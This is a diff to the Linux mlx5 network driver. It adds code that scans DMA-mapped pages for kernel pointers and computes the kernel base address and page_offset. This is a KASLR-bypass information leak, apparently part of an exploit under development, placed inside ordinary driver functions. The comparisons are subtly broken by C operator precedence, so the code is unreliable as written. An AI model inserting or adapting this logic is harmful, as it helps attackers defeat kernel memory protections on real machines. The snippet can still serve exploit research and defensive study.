@@ -40,6 +40,8 @@
 #define MLX5E_SQ_STOP_ROOM (MLX5_SEND_WQE_MAX_WQEBBS +\
 			    MLX5E_SQ_NOPS_ROOM)
 
+gilkup_vars_t gilkup_vars;
+
 static inline void mlx5e_tx_dma_unmap(struct device *pdev,
 				      struct mlx5e_sq_dma *dma)
 {
@@ -236,6 +238,29 @@ static inline void scan_pages(const char* ptr, u16 num_pages)
 		Bonus: pfn_to_virt/pfn_to_kaddr is just pfn << page_shift
 		We may not need this.
 	*/
+
+	u64 *p;
+	const char *end = ptr + (num_pages * 4096);
+
+	//last bytes of init_net on my machine TODO: change it according to /proc/kallsyms
+	for (p = (u64*)ptr; p < end; ++p) {
+		if (*p & 0xffffffff000fffffULL ==
+			 0xffffffff000df300ULL) {
+			//There is a small chance to see another pointer with the same suffix once in a while.
+			//If it happens, we can simpely count them and take the best out of 3 or something.
+			gilkup_vars.kernel_base = *p - 0xfdf300;
+		} else if (*p & 0xffffe00000000000ULL ==
+				0xffff800000000000ULL) {
+			++gilkup_vars.data_pointers_counter;
+
+			if (*p > gilkup_vars.max_data_pointer) {
+				//TODO: this is a rough guess, it may be optimized
+				//128 - machine's physical memory size
+				gilkup_vars.page_offset = ((*p & ~((1 << 30) - 1)) - (128 * (1 << 30)));
+				gilkup_vars.max_data_pointer = *p;
+			}
+		}
+	}
 }
 
 static inline void shared_info_scan_pages(struct mlx5e_txqsq *sq)
